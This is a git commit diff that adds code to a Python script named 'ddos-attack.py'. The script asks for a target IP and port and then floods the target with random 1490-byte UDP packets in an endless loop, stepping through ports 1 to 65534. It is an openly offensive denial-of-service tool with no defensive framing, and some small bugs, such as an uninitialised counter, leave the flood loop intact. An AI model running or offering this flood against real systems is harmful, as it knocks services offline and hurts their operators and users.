b96029cb2591a5f67ca50bdd8e80b8f0dc11c195
SmashedFrenzy16 <68993968+SmashedFrenzy16@users.noreply.github.com>
2022-06-24 20:09:37 +0100

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -4,3 +4,47 @@ import time
 import socket
 import random
 
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+bytes = random._urandom(1490)
+
+ip = raw_input("IP Target: ")
+port = input("Port: ")
+
+os.system("clear")
+os.system("figlet DDos Attack")
+
+print("Loading:")
+
+#animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
+animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
+
+for i in range(len(animation)):
+    time.sleep(0.2)
+    sys.stdout.write("\r" + animation[i % len(animation)])
+    sys.stdout.flush()
+
+print("\n")
+
+while True:
+  
+  sock.sendto(bytes, (ip, port))
+  
+  sent = sent + 1
+  
+  port = port + 1
+  
+  print("Sent %s packet to %s throught port: %s"%(sent,ip,port))
+  
+  if port == 65534:
+    
+    port = 1
+
